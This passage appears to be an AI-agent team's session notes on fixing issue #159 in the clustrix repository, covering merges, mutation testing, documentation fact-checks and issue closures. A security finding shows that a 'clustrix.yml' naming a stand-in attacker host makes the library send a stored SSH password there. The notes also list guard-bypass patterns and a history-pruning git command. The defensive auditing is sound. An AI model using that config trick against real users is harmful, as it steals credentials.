# Session notes: issue #159 campaign (sole session)

**Goal (standing):** #159 FULLY addressed, including anything that surfaces
along the way; all changes merged into `master` with all tests green; *direct
evidence* of each fix posted as a comment on the issue; all issues closed as
appropriate.

**Protocol (standing):** as agents finish, red-team with NEW subagents, fix
with more subagents, repeat until clean.

**As of 2026-08-20 the Codex documentation session is finished.** This is now
the only session touching the repository. The "file, do not fix" rule on
documentation (#163) is lifted; #163 updated to say so.

## Worktrees in play

| Path | Branch | Base | Owner |
|-|-|-|-|
| `/Users/jmanning/clustrix` | `work/priorities-and-docs` | — | main; carries 16 uncommitted doc files from the finished Codex session |
| `/Users/jmanning/clustrix-fixes` | `work/fixes` | `0df81ca` | #166 + #167 agents |
| `/Users/jmanning/clustrix-silent` | `work/silent-failures` | `4126a03` | #123 remainder |
| `/Users/jmanning/clustrix-widget` | `work/widget-apply` | `4126a03` | #165 |

`work/fixes` is based on `0df81ca`, an ancestor of `4126a03`. Everything merges
into `work/priorities-and-docs`, then that into `master`.

Stale worktrees `/private/tmp/clx-master` and `/private/tmp/clx-scratch` were
verified clean and removed.

## #159 sub-issues — status

Eight are now formally linked as sub-issues (`gh api .../sub_issues`). #123
could not be linked: GitHub allows one parent and it already belongs to #108.

| Issue | State | Evidence comment |
|-|-|-|
| #152 cores does not parallelize locally | fixed `f0b1218` + `4126a03` | pending red-team |
| #153 `cred_manager` does not exist | fixed `f790cdd` + `60f30a0` | **posted** |
| #157 `auto_add` rewrites known_hosts | fixed `ea46f05` | posted |
| #158 `queue` accepted and never read | fixed `fa12781` | posted |
| #123 silent failures / leaks / import side effects | context managers done; import-time + 10 swallow sites in flight | — |
| #164 `environment=`/`conda_env_name` never reach the job script | **not started** | — |
| #165 widget Apply always fails | in flight | — |
| #166 doc checker skips every notebook | in flight | — |
| #167 empty credential host matches any server | in flight | — |

## #123 remainder, measured

Already done: `shlex.quote` in `utils.py`, `job_wait_timeout`, single async
executor, no pip-install at import, `remote_file_exists`, and — verified this
session — `__enter__`/`__exit__` on both `ClusterExecutor`
(`executor_core.py:347,356`) and `ConnectionManager`
(`executor_connections.py:81,90`).

Still open when the agent was dispatched:

- import-time side effects: `_config = ClusterConfig()` (`config.py:556`) and
  `_load_default_config()` (`:721`) — the latter reads `~/.clustrix/` as a side
  effect of `import clustrix`
- ten swallow sites: `executor_core.py:376`, `executor_scheduler_status.py:118`
  and `:345`, `loop_analysis.py:333` and `:639`, `utils.py:745`, `:749`, `:807`,
  `:881`, `:1099`

## #153 evidence (posted, reproducible)

```
$ grep -rn "cred_manager" tests/ clustrix/ | wc -l
0
$ python -m pytest tests/real_world/ --collect-only -q
155 tests collected
$ python -c "import tests.real_world.credential_manager, os; \
    print([k for k in os.environ if k.startswith(('TEST_','HUGGINGFACE_','SSH_PASS'))])"
[]
```

Three independent silencers had kept it invisible: the `AttributeError` fired
inside test bodies not at import, CI excludes `tests/real_world/`, and until
#147 the workflow that runs it discarded every result and exited 0. Four of the
tests also `return False` on missing credentials — **pytest reports a returned
`False` as a pass**.

## Codex's uncommitted documentation

16 files, +620/−594, `README.md` + `docs/` only — no code touched, which is
what that session was asked to respect. Plus a new untracked
`docs/source/documentation_style.rst`. Under fact-check against the code before
it lands; this project's failure mode is documentation asserting features that
do not exist, so provenance is not evidence.

## Traps that have bitten this campaign

- **`black` version skew.** The project pins `black==26.3.1`; the `black` on
  PATH is 25.11.0 and they disagree, so a local `--check` pass does not mean CI
  passes.
- **Probe scripts run outside pytest bypass the autouse `isolate_home`
  fixture** and have polluted the real `~/.ssh/known_hosts` twice. Set `HOME`
  and `CLUSTRIX_CONFIG_DIR` explicitly in every standalone script.
- **Agents sharing one working tree collide on the git index** — one swept
  another's staged files into its commit. Hence the worktree-per-agent split
  and "stage explicit paths only".
- **Reverting a mutant with `git checkout` destroys unstaged work.** Keep a
  scratchpad backup of each mutated file instead.
- `tests/integration/` provisions real billable AWS resources; never run it.

## Documentation fact-check result (2026-08-20)

The Codex overhaul was fact-checked against the code before landing. It was
**not** clean — five factual errors, three of them HIGH, all introduced or left
stale by the overhaul, all now fixed in the working tree:

| # | File | Claim | Truth |
|-|-|-|-|
| 1 | `execution_model.rst:105` | "`cores=0` also falls back" | `decorator.py:80-84` raises `ValueError` since `4126a03` |
| 2 | `limitations.rst:624` | "any falsy value takes the default" | same |
| 3 | `execution_model.rst:109` | "`queue` and `default_queue` were removed in #158" | `default_queue` is still a field (`config.py:71`); it **warns**. Also narrates history, which is banned |
| 4 | `execution_model.rst:46` | sample output lists `'queue': None` | no `queue` key exists |
| 5 | `configuration.rst:529` | "local chunking uses `os.cpu_count() * 2`" | now `max_workers or os.cpu_count()` |

Item 3 was worth chasing beyond the doc fix: it reads as if #158 were
incomplete. It is not. #158's deliberate resolution was to remove
`@cluster(queue=...)` entirely and leave `default_queue` as a **warning**
field for #161's inert-field sweep to decide. Confirmed:
`grep -rn default_queue clustrix/` returns the field plus three lines in
`decorator.py` that exist only to warn about it.

Build state at that point: `sphinx -W` exit 0, zero clustrix warnings;
`check_docs_examples.py` 151 blocks / 151 passed / 0 failed; all 7 notebooks
valid under `nbformat`.

Left for the cleanup pass: ~150 stray leading spaces inside notebook string
literals (`print(" Clustrix imported…")`) — the orphans of a removed emoji;
the `parallel=True` phrasing in three files (`auto_parallel` defaults to
`True`, so it is never required); "logs a warning" stated unconditionally in
`README.md`/`introduction.rst` when `_warn_cores_unused` returns early twice;
and relocating `documentation_style.rst` out of user-facing docs — it
addresses contributors and prescribes an internal workflow.

## Merge state

`origin/master` = `master` = `f78d153`, fully contained in the branch.
`work/priorities-and-docs` is **57 commits ahead, 31 unpushed**, no PR open.
Nothing has reached `master` yet — that is the last mile of the goal.

Issues fixed on this branch but still open, to close **after** the merge, with
evidence already gathered: #147 (`6dd0985`), #150 (`e9a57d9`), #122
(`8ddf813`), #117 (`aa545e0`).

PR #156 (external contributor, `#154`) is handled — #154 is closed by a
different approach and the contributor has been told. Leave their PR for them
to respond to; closing it unilaterally is not ours to do.

## Anticipated merge conflicts

Four branches land into `work/priorities-and-docs`. Overlapping files:

- `clustrix/config.py` — #167 agent, #123 agent, possibly #165
- `clustrix/utils.py` — #123 agent (swallow sites ~745-1099), #164 agent
  (`job_execution_lines`, ~1168/1556/1579/1778). Different regions; should
  merge cleanly but verify.
- `work/fixes` is based on `0df81ca`, an ancestor of the others' `4126a03`,
  so it is a real merge rather than a fast-forward.

## Progress log

### `f9879d2` — documentation landed (main checkout)

The Codex overhaul plus the fact-check corrections plus the cleanup pass, in
one commit. 139 orphan leading spaces removed from notebook strings, 196
deliberately kept as real indentation. `documentation_style.rst` relocated to
`CONTRIBUTING.md`. All seven notebooks verified independently after the
cleanup agent reported it had exploded and repaired `basic_usage.ipynb`:
nbformat-ok and round-trip byte-stable for all seven, no exploded cells, and
that file's diff is the expected 15 lines.

**Hazard noted:** committing in the main checkout while the #152 red-team is
mutating `clustrix/decorator.py` made the pre-commit framework stash and
restore that unstaged mutation. It restored correctly, but this is a race —
**do not commit again in a tree where an agent is mid-mutation.**

### `ddd0a39` — #166, the doc checker now sees notebooks (work/fixes)

30 files / 0 notebooks → 239 checks / 36 files / 7 notebooks. Execute-vs-static
is decided **per notebook, never per cell**, because skipping one cell breaks
every later one.

It found seven real failures on its first run, and they must be fixed before
this branch merges because the checker runs in CI:

- `slurm_tutorial.ipynb` cells 5, 19 — reach a real host, unmarked
- `ssh_tutorial.ipynb` cells 6, 8, 18 — same
- `local_parallel_comparison.ipynb` cells 7, 9 — **stale output**: a fresh run
  emits the #152 warning that the published page does not show

The last one is the case #166 existed to catch: the notebook publishes measured
numbers, #152 changed the behaviour being measured, nothing noticed. It needs
**re-running**, not editing — and re-running requires a tree where no agent is
mutating `decorator.py`.

Deliberately NOT implemented: literal output-text comparison. Timings,
hostnames, temp paths, `cpu_count()`, `get_start_method()` and object addresses
differ between two correct runs; masking numbers still leaves `Darwin`/`Linux`
and `spawn`/`fork`. A checker that noisy gets switched off.

### `481597f` — #164, named conda environments honoured (work/named-env)

`resolve_named_environment` routes both `@cluster(environment=)` and
`configure(conda_env_name=)` into the existing `job_execution_lines`; no second
generator. Named environment beats replication and replaces **VENV2 only** —
VENV1 is clustrix's own serialization machinery and needs local-version Python
plus dill. A warning fires when both are in play.

Guarded by 7 golden job scripts generated by the *pre-change* generator and
compared byte-for-byte, so replication cannot drift silently. 8 mutants, all
killed.

**Open, and it cannot be closed without it:** no real job has run in a named
conda environment on real hardware. Local tests prove the value reaches the
generated script text — not that `conda run -n <name>` resolves, that conda is
on PATH in a batch shell, or that the job succeeds. Cluster access needs VPN
and the passwords go stale, and the owner is remote.

## Notebook checker: 5 of 7 failures fixed, 2 deliberately deferred

Added `# cluster-required: <reason>` as the first line of the five cells that
reach a real host — `slurm_tutorial` 5 and 19, `ssh_tutorial` 6, 8 and 18.
Uncommitted in the main checkout (the #152 red-team is mutating that tree; do
not commit there until it finishes). 5 insertions, `nbformat` clean. Marker
matches the checker's `CLUSTER_REQUIRED_RE`.

The remaining two are `local_parallel_comparison.ipynb` cells 7 and 9:

```
FAIL [output] cell 7: stored output is stale: the notebook ships
  ['stream:stdout'], a fresh run produces ['stream:stderr', 'stream:stdout']
```

The extra stderr is the #152 warning. **Re-run this notebook LAST**, after
every code change has merged — #123 (import-time config), #164 (job script
generation) and #165/#167 can all change what it measures, so re-running now
guarantees re-running again. Re-run in a worktree at the merged tip with
`PYTHONPATH` pointed at that worktree: the editable install otherwise resolves
`clustrix` to `/Users/jmanning/clustrix` regardless of where the notebook runs.

## Ordering for the final mile

1. All five in-flight agents report; red-team each; fix until clean.
2. Merge `work/fixes`, `work/silent-failures`, `work/widget-apply`,
   `work/named-env` into `work/priorities-and-docs`. Expect conflicts in
   `config.py` (three branches) and `utils.py` (two).
3. Re-run `local_parallel_comparison.ipynb` at the merged tip; commit its
   refreshed output.
4. Full gates: pytest, flake8, mypy, and black with the **pinned** 26.3.1.
5. `check_docs_examples.py` must reach 239/239.
6. Push, open the PR, merge to `master`.
7. Close with evidence: #152, #153, #157, #158, #164, #165, #166, #167, plus
   the already-fixed-but-open #147, #150, #122, #117. Roll up on #159.

## Closure assessment for issues with work on this branch

Checked each against its own stated criterion rather than against how much work
landed.

| Issue | Criterion | Verdict |
|-|-|-|
| #116 | `grep -rn "unittest.mock\|MagicMock\|isinstance(.*Mock" clustrix/` empty | **met** — grep is empty. Closeable |
| #147 | runner exits non-zero on failure | met (`6dd0985`), 4 cases incl. a control. Closeable |
| #150 | three services gone from compose + setup | met (`e9a57d9`), `docker-compose config` parses to exactly `{ssh-server, slurm-mock}`. Closeable |
| #151 | declared data staged; streaming split to #155 | `staging.py` present, verified 8/8 against real HF. Closeable |
| #117 | replace assertion-free mock tests | **not met** — 21 of 166 test modules still use mock. Stays open |
| #122 | delete ~5,100 lines of orphaned modules | **not met** — 34 modules remain in `clustrix/`. Stays open |
| #111 | rotate tokens, secret scanning, file permissions | scanning + permissions done; token rotation unconfirmed. Verify before closing |
| #125 | rewrite CLAUDE.md, resolve mocking contradiction | appears done; re-read before closing |

### A counting false positive worth not chasing twice

CLAUDE.md pins the mock-using test-module count and says new tests must not
raise it. It reads 21 now against a recorded 20. The one module new on this
branch is `tests/unit/test_no_mocks_in_shipped_code.py` — the #116 guard
itself, which matches the counting grep because it names the forbidden
patterns **as data**:

```
FORBIDDEN_MODULES = frozenset({"mock", "unittest.mock", "pytest", "_pytest"})
```

It imports no mock (`grep -nE "^\s*(import|from)\s+.*mock"` finds nothing). The
count also moved because the denominator grew from 152 to 166 test modules. No
regression; the guard is simply uncountable by the metric it enforces. Worth
recording in CLAUDE.md when that count is next quoted.

## Merge dry run (no working tree touched)

`git merge-tree --write-tree`, chained through synthetic commits so each merge
sees the previous one's result:

```
work/fixes        -> clean
work/widget-apply -> clean
work/named-env    -> clean
```

`work/silent-failures` had not committed yet; re-run this before merging.

Two files are touched by more than one branch — `clustrix/config.py` and
`clustrix/notebook_magic_widget.py` — and git resolves both without conflict
because the edits are in different regions.

### A semantic collision the clean merge hides

`config.py` will end up with **four** independent derivations of the same set:

| Source | Line | Expression |
|-|-|-|
| #167 | 378 | `{f.name for f in fields(ClusterConfig) if _NOT_ACTUALLY_SECRET…}` |
| #167 | 390 | `{f.name for f in fields(ClusterConfig) if _is_secret_field…}` |
| #167 | 415 | `PERSISTABLE_KEYS = {f.name for f in fields(ClusterConfig)} | …` |
| #165 | 597 | `config_field_names() -> frozenset(f.name for f in fields(...))` |
| both | 657/664 | `known = {f.name for f in fields(ClusterConfig)}` |

Textually clean, but it violates the project's explicit no-duplication rule and
means a future change to how fields are enumerated has to be made in four
places. **Post-merge task:** make `config_field_names()` the single derivation
and have `PERSISTABLE_KEYS`, `split_config_kwargs` and the `known` checks call
it. The filtered sets (secret / not-secret) legitimately stay separate — they
apply different predicates — but they should filter `config_field_names()`
rather than re-walk `fields()`.

## #111 — five of six items verified done; item 1 nearly closed

Checked each against its own criterion rather than against commit count:

| Item | State |
|-|-|
| 2. secret scanning + push protection | enabled, verified in a prior session |
| 3. stop generating scanner bait | done — no `AKIAIOSFODNN7EXAMPLE` / `hf_abcdefghij` in `credential_manager.py` |
| 4. `.gitignore` a bare `.env` | done — `.gitignore:66` |
| 5. credentials written world-readable | done — created 0600, not narrowed after |
| 6. GCP service-account JSON leaked to `/tmp` | gone — zero `GOOGLE_APPLICATION_CREDENTIALS` in `cli_credentials.py`; removed with the cloud backends |

### Item 1 — the two real HF tokens

**Both are dead.** Tested against HuggingFace's own API on 2026-08-20; each
returns `HTTP 401` from `/api/whoami-v2`. Values were never printed, and the
only recipient was their issuer.

```
hf_Fbf…Wdzx  ->  HTTP 401  ->  revoked
hf_hSV…vlkE  ->  HTTP 401  ->  revoked
```

`refs/original/refs/heads/master` (the `filter-branch` backup that still made
commit `d30acd2` reachable) is **deleted**, with the owner's authorization.
Verified after: all six branch tips byte-identical to before, and `d30acd2`
reachable from no ref.

**Deferred, deliberately:** `git reflog expire --expire=now --all &&
git gc --prune=now`. Four agents are committing in worktrees right now, and
`--prune=now` removes git's two-week grace period — an object written between
the prune and its ref update can be collected. Run it **only when every agent
is idle**, as the last step before the final push. Until then the objects
survive in the reflog, unreachable but not yet collected.

## #123 remainder landed — `214fbce` on work/silent-failures

**Import-time decision: lazy file read, eager singleton.** Evidence closed the
"keep it eager and prove it harmless" option outright — a subprocess probe with
a scrubbed `$HOME` showed `import clustrix` **raises `PermissionError`** when
`~/.clustrix` is unreadable. `Path.exists()` answers False for ENOENT but
propagates EACCES, and that call sat outside the `try`. It also read
`./clustrix.yml` from whatever directory the process happened to start in.

Deferring is safe because nothing in the package does
`from .config import _config` — all 25 reads go through `get_config()`, and
`load_config()` already *rebinds* `_config`, so a by-name importer was broken
regardless.

Its own concurrency test caught a race in its first version: publishing the
"loaded" flag before the search let a second thread take the fast path and
receive the pre-load config. Fixed with a separate in-progress flag read only
under the lock.

**Swallow sites:** bare `except Exception:` 36 → 18; shrug-shaped bodies
21 → 2, both on an enforced allowlist. Full 45-site audit in
`notes/issue-123-swallow-audit.md`, 24-row decision table in the commit.
Notable: `utils.py:752` now **raises** — the stdlib-`pickle` fallback is gone,
which matters given that a `pickle`/dill asymmetry is what broke remote
execution for every `__main__` function. 21/21 mutants killed.

### The flagged "CI blocker" is not one — but check the premise, not the claim

The agent reported: *"`black==26.3.1` requires Python ≥3.10, but the package
supports 3.9 (repo interpreter is 3.9.13) — CI will fail on any 3.9 job."*

The premise is false. The project requires **≥3.10** (`pyproject.toml:19`,
`setup.py:31`) and the CI matrix is `['3.10','3.11','3.12']` with no 3.9 job.
No blocker.

What is real: **the local interpreter is 3.9.13, below the project's own
floor.** That is why every agent has needed a separate venv for the pinned
black, and it means a local green run is not the same environment CI validates.
Worth fixing the local environment rather than the pin.

### Flagged, not fixed — candidates for follow-up issues

1. `notebook_magic_config.py:115` returns `{}` for a widget-selected file that
   is malformed — the same defect just fixed at `config.py:716`.
2. `notebook_magic_widget.py:941` — a failed scan empties the "Overwrite"
   dropdown, so the user silently creates a duplicate.
3. `utils.py:889` — `deserialize_function`'s dill→cloudpickle fallback discards
   dill's reason.

## H1: a live credential-exfiltration path (verified personally, not taken on report)

The #167 red-team overturned the implementing agent's judgement. That agent
left `executor_connections.py:139` unfixed, arguing `config.cluster_host`
"comes from the user's own config, not an attacker". **False.**

```
~/.clustrix/.env   SSH_PASSWORD=<real password>
./clustrix.yml     cluster_host: totally-unrelated.attacker.example
                -> password shipped to that host, no host check on the path
```

Cloning a repository that ships a `clustrix.yml` is sufficient. Note
`~/.clustrix/clustrix.yml` is **not** in the search list (`config.yml` is), so
the cwd copy usually wins outright.

### The `214fbce` overlap — checked directly, because two agents disagreed

`work/silent-failures` claims to have removed the cwd read. **It has not.** It
moved the read from import-time to first-use and hardened `getcwd()` failure
handling; the entry survives:

```
$ git show 214fbce:clustrix/config.py | grep -n cwd
746:        cwd = Path.cwd()
759:            cwd / "clustrix.yml",
760:            cwd / "clustrix.yaml",
```

Its own docstring at `:824` describes the behaviour as something the *old*
code did. Laziness changes *when* the file is read, not *whether* — and since
any real use of clustrix calls `get_config()`, the attack is unchanged in
practice. Both halves of H1 are therefore live and both are assigned to the
#167 fix agent.

**Design steer given:** do not simply delete the cwd entry. A project-local
`clustrix.yml` is a legitimate per-project pattern and removing it may break
real users. The distinction that matters is **trust, not existence** — a
cwd-sourced config supplying ordinary settings is fine; one supplying the
*hostname a stored credential gets sent to* is not. Provenance on loaded
values lets the credential layer ask the right question.

## Filed: #168

Successor to #123 for three residual silent-failure sites, verified present:
`notebook_magic_config.py:115` (malformed user-chosen file reports as empty),
`notebook_magic_widget.py:941` (failed scan empties the Overwrite dropdown, so
the user silently creates a duplicate), `utils.py:889` (`deserialize_function`
discards dill's reason, on the path where diagnosis is already hardest).

Deliberately **not** linked as a #159 sub-issue: #159's definition of done
allows "#123's remaining items closed or split into concretely-scoped
successors", and filing it satisfies that. Making it a sub-issue would block
#159 on work it explicitly permits deferring.

## #152 round-two fix — `1005244`

All four round-one findings addressed, and every previously-surviving mutant
now dies:

| Mutant | Round 1 | Round 2 |
|-|-|-|
| M4 unwire `max_workers` at `decorator.py:585` | **SURVIVED full suite** | 5 failed |
| M1 `// (workers * 2)` → `// workers` | **SURVIVED full suite** | 5 failed |
| M2 drop bool exclusion | n/a | 1 failed |
| M3 drop `reported.add(key)` | n/a | 2 failed |
| M5 throttle global not per-function | n/a | 2 failed |
| M6 `workers = os.cpu_count()` | n/a | 6 failed |

`1728 passed, 17 skipped` (baseline 1717, +11 items). flake8, mypy and the
pinned black all clean.

The `*2` chunk-granularity factor was judged **load-bearing** and kept —
queue slack is the only rebalancing a fixed pool has — and is now tested at
four pool sizes rather than left as an untested magic number.

The warning is throttled per decorated function per `(where, because)` pair,
so a changed `default_cores`, a different decline reason, or a separately
decorated function all still speak. Round two is judging whether that throttle
can hide an occurrence a user needed to see.

### Two process observations worth keeping

1. **A commit message overclaimed coverage.** `4126a03` states the width test
   "passes at cores of 2, 4 **and 8**"; 8 was not in the shipped parametrize.
   The published commit cannot be rewritten, so the discrepancy is recorded in
   `1005244` and 8 is now genuinely there. Claims about test coverage belong in
   the test, not only in prose.
2. **A test docstring reasoned about its own mutant backwards** — it claimed
   unwiring reports *too many* workers when it reports too few. A test can be
   right while the reason given for it is wrong, and the wrong reason is what
   the next person reads.

## #164 round-two fix — `d22a9fa`

All six round-one findings addressed. The 7 goldens are still byte-identical,
10 mutants killed, 1800 passed.

F1's fix emits a search — `venv_info["conda_setup_prefix"]` if measured, else
`$CONDA_PREFIX`, `conda info --base`, `~/miniconda3`, `~/anaconda3`,
`~/miniforge3`, `/opt/conda`, `/usr/local/{mini,ana}conda3` — sharing one list
with the SSH probe rather than writing a second. An already-working `conda` is
left alone; nothing found produces `exit 1` naming the environment, the paths
searched, and the `module_loads` / `pre_execution_commands` that ran earlier.
The emitted shell was tested **by running bash against real fixture
directories**, not by reading it.

F2 splits precedence: the named path uses `config.python_executable`,
replicated environments keep `python` (a pinned build). Round two is judging
whether that split is correct or merely surprising.

### Still unverifiable without hardware — paste-ready for the issue

No job has run on any cluster. F1 is reasoned from non-login-shell semantics
and verified only against local bash. Unproven: that the search locates conda
on discovery / ndoli / tensor01; that `conda run -n <env>` succeeds there; that
the `exit 1` diagnostic reaches a SLURM `.err` file; that a function truly
executes inside the named environment; and that `conda run -n env python3.11`
works against an environment holding that interpreter.

## Verified personally: #157 and #158 evidence is sound

Those comments were written by an earlier session, so I checked rather than
inherited them.

- **#157** — `AppendUnknownHostKeyPolicy` appends one line; `ssh_security.py`
  documents why (`save_host_keys` rewrites the whole file, so twelve concurrent
  threads interleave and an interrupted rewrite truncates). Tests present:
  `test_host_key_policy.py`, `test_known_hosts_atomicity.py`. It is also honest
  about what it does *not* protect against — a wholesale rewriter like
  `ssh-keygen -R`, and the fact that appending never removes anything.
- **#158** — `create_job_script("slurm", {... "queue": "gpu"} ...)` →
  `"gpu" in script` is `False`.

## #159's last criterion is satisfied

`notes/issue-123-swallow-audit.md` (111 lines) records a decision per site, and
reports four separate measurements rather than one flattering number:

| Measure | Before | After |
|-|-|-|
| exact `except Exception:$` grep | 36 | 18 |
| including `# pragma` / `# noqa` trailers | 45 | 24 |
| all forms, AST count incl. `as e` | 123 | 123 |
| bodies that are only `pass`/`return None`/`continue` | 21 | 2 |

The two survivors are allowlisted with written reasons, and the allowlist is
enforced **in both directions** — a new unjustified shrug fails, and so does a
stale entry, so the allowlist cannot rot.

## #165 red-team — and a correction I owe the record

**F2 HIGH confirmed, but my diagnosis was wrong.** I said the stale-host defect
was in the load path. It is the **save** path. The load path is fine —
`host_field` correctly reads `''`. The culprit is
`notebook_magic_widget.py:733`:

```python
config = {k: v for k, v in config.items() if v != ""}
```

Empty values are stripped, so `configure()` is never told to *clear* anything
and the previous profile's values survive:

```
host control: ''                                  <- the UI is correct
'local' 'hpc.example.edu' 'researcher'            <- the live config is not
```

A run the user configured as **local** carries a remote host into `@cluster`.
Legacy widget only; the modern one is immune via `BACKEND_ONLY_FIELDS`.

Other findings: F1 the `⚠️ Ignored` branch is unreachable in production (Apply
reads a fixed key list, never the stored profile); F3 the `queue`/`ssh_key_path`
migration fallback has **zero** coverage — deleting it leaves the exact baseline
1726 passed; F4 the modern widget's printed summary contradicts `get_config()`.

## Meta-finding: three fixes shipped a justification ahead of the mechanism

Independent agents, independent issues, same failure:

| Where | The claim | The reality |
|-|-|-|
| #167 | the `^use_` freeze closes the `USE_PASSWORD` hole | vacuous — `_is_secret_field` has one caller, so unfreezing it survives as a mutant. The hole was closed by `UNCLASSIFIABLE_FIELDS` |
| #165 | a stale profile's unrecognised keys are "said out loud" | branch unreachable; keys are dropped silently and erased from `widget.configs` |
| #152 | the width test "passes at cores of 2, 4 **and 8**" | 8 was absent from the parametrize |

None of these is a lie; each is a plausible mechanism written up before it was
exercised. The common defence is the one this campaign already relies on:
**mutation testing**. All three were found by asking "does anything fail if I
remove this?" — not by reading the code, and not by running the suite, which
stayed green in every case.

The operational lesson: a guard is not verified by the test that accompanies
it. It is verified by deleting the guard and watching that test die.

## #123 red-team — the fix for silent failures introduced two silent failures

Both are **new**, created by moving the config search out of import. Neither was
possible before `214fbce`, because the search ran before any threads existed.

- **F1 HIGH — a concurrent `load_config()` is silently discarded.**
  `config.py:614` takes no lock; the deferred search at `:855` can finish
  *after* it and rebind `_config` over it.
  ```
  main:  host = EXPLICIT
  FINAL: host = SLOWHOME      <- the explicit load was thrown away
  ```
  `test_an_explicit_load_supersedes_the_search` is single-threaded and cannot
  see it.
- **F2 MED — `fork()` during the lazy search deadlocks the child.** It inherits
  a held `_DEFAULT_CONFIG_LOCK` and `_default_config_loading=True`; its first
  `get_config()` never returns. Concrete, not theoretical: `LocalExecutor` uses
  `ProcessPoolExecutor` and `fork` is a real start method.

That is #123's own defect class, recreated by #123's fix. The suite was green
throughout.

Also found: **F3** the commit *breaks* `tests/unit/test_check_for_secrets.py` —
a new password-shaped literal in that file trips the repo's own
scanner (the fix must not extend the suppression list; precedent is to use an
already-tolerated form); **F4** a surviving mutant — `save_config()` as first
config touch writes `cluster_host: null`; **F6** the `"unknown"` status change
is behaviourally inert, the log line is the real gain, and the commit message
overstates it; **F7** the audit's own all-forms count is wrong (measured
134 → 123, not 123 → 123) and `tests/unit/test_widget_profiles.py:30` **does**
`from clustrix.config import _config`, so "nothing imports it by name" holds
only package-scoped.

### F5 — the fourth static guard to be defeated

13 bypasses, control caught: `except BaseException` · bare `except:` ·
`except (Exception,)` · aliased `_Exc = Exception` ·
`contextlib.suppress(Exception)` · `return False` · `...` · `break` · dead
assignment · `if False: raise` · `finally: return` · `logger.debug("")` with no
exception · a nested fn renamed to an allowlisted key. Plus a **key collision**
(any nested `__del__` in `executor_core.py` is auto-allowed) and a glob that
only covers `clustrix/*.py`, missing subpackages.

Previous static guards in this project fell 12, then 30, then 14+16 ways; the
answer that finally held was a **behavioural** guard
(`test_persisted_files_are_private.py`). The fix agent has been pointed at that
precedent and told that any bypass it cannot close must be recorded as a
labelled blind spot rather than left implicit.

### What HOLDS

Both original defects are real and fixed (verified on `214fbce^`: a
`PermissionError` traceback on import, and `at-import host=CWDTRAP`). The
published-flag race is gone — 0 bad trials in 200 with 32 threads. Removing the
stdlib-`pickle` fallback is safe across 22 object shapes. Item C judged 10 sites
and found **no** case where "log and continue" leaves the caller unable to get a
correct answer.

## Filed: #169

Branch protection requires `CI Status`, which only `fast_ci.yml` produces — and
that workflow is path-filtered to `clustrix/**`, `tests/**`, `setup.py`,
`pyproject.toml`, `requirements*.txt`. A PR touching none of those never
triggers it, and GitHub blocks on *"Expected — Waiting for status to be
reported"* rather than treating absence as success. **Every documentation-only
PR is unmergeable.**

Distinct from the already-fixed skipped-job case: a job skipped inside a
workflow that ran still reports a conclusion (hence `tests-status` and
`if: always()`); a workflow that never triggers reports nothing. This PR is
unaffected — it touches `clustrix/` and `tests/`.

## Post-merge documentation tasks (exact, verified passages)

The in-flight branches make these claims false the moment they land. Fix
**after** the merge, not before — the merge will move line numbers.

1. **`docs/source/configuration.rst:26`** — currently:

   > **At import.** ``import clustrix`` calls ``_load_default_config()``, which
   > tries these paths in order and stops at the first one that loads

   False once `work/silent-failures` merges: the search is deferred to first
   use, not run at import. Also affects `:78` ("the configuration file found at
   import") and `:91` ("searched at import"). The list of paths itself stays
   correct — only *when* changes. If the #167 work removes or de-trusts
   `./clustrix.yml`, item 4 of that list changes too; check both branches
   before rewriting.

2. **`docs/source/configuration.rst:311-313`** — currently:

   > ``conda_env_name`` — Passed through as the job's ``environment``.

   Understated once `work/named-env` merges. It no longer merely "passes
   through": it reaches the generated script, replaces VENV2 only, warns when
   it collides with replication, and now carries a one-time migration warning
   because the field was inert for its whole life. `docs/source/api/config.rst:192`
   ("Conda environment to activate on the cluster") becomes true rather than
   aspirational, and `README.md:432`'s `environment='tensorflow-env'` example
   starts working.

3. **`docs/source/api/notebook_magic.rst:70`** — "Apply calls
   :func:`clustrix.configure` with the widget's values" is now only half the
   story; it sends a filtered set derived from `fields(ClusterConfig)`. Worth a
   sentence once #165's fix round settles.

Already handled: `execution_model.rst:96-110` was updated by `1005244` and
correctly documents the `cores=0` / `cores=-2` / `cores=True` rejections,
including *why* `True` is rejected (`bool` subclasses `int`).

## `local_parallel_comparison.ipynb` — re-running is sufficient; no rewrite

Read the whole notebook to check whether #152 invalidated its argument. It
does not. The narrative is:

- cell 2: `local` is a real backend but not a parallel one
- cell 6/8: `@cluster(cores=N)` on `cpu_task` equals the bare call, within noise
- cell 10: local parallelism comes from `LocalExecutor`, not the decorator
- cell 20/22: `auto_parallel` defaults True; leave it off for local runs

All still true after #152. Cells 7 and 9 wrap a function with **no
parallelizable loop**, so they fall back to sequential — and now emit the new
warning, which is precisely the `stream:stderr` the checker flagged as missing
from the stored output.

Re-running therefore *strengthens* the notebook: it demonstrates clustrix
telling the user that `cores` was discarded, which is the whole point of #152's
resolution. Cell 21 (`parallel=True`) exercises the path that does parallelize
and is unaffected.

**Action: re-run only.** While doing so, re-read cells 2, 8, 20 and 22 for
wording that the new warning makes redundant or contradictory — but expect no
substantive edit.

## Correction: #151 is NOT closeable

An earlier note in this file listed it as closeable on the strength of
`staging.py` existing and passing 8/8 against real HuggingFace. Wrong — I had
not read the issue's own structure.

#151 is a **five-phase plan**, and it is already a sub-issue of **#160**
(deferred / future functionality):

```
Phase 1  Primitives: cluster_put / cluster_get
Phase 2  Content-addressed store, manifest, dedup
Phase 3  @cluster(inputs=..., outputs=...)
Phase 4  Shared-FS elision and quota safety
Phase 5  stage_backend="rsync"  (only if 1-4 hit a wall)
```

`staging.py` is a declaration-only subset, and CLAUDE.md is explicit that there
is **no `cluster_put` / `cluster_get`** — i.e. Phase 1 is not done. Leave open
under #160.

The lesson generalises: "a lot of work landed against this issue" is not the
same as "this issue's criteria are met". Check the issue's own definition of
done, not the commit count — the same mistake that made #117 and #122 look
finished.

### Closure list, corrected

| Closeable now (after merge) | Stays open |
|-|-|
| #116 — grep criterion empty | #117 — 21 of 166 test modules still mock |
| #147 — runner exits non-zero, 4 cases + control | #122 — 34 modules remain |
| #150 — compose parses to exactly `{ssh-server, slurm-mock}` | #151 — phases 1-5, deferred under #160 |
| | #111 — pending the deferred `gc --prune=now` |

## #165 round-two fix — `bc15217`

All four findings fixed; 10 mutants RED including **M9**, the migration
fallback that previously survived deletion with the exact baseline count.
`1737 passed, 17 skipped` (baseline 1726 + 11 new tests), under Python 3.11.16.

F2's root cause was confirmed as the **save** path stripping empty values, so a
cleared control said nothing. The modern widget's reset was generalised into
`config.split_config_kwargs(..., reset_fields=)` and both widgets now share it,
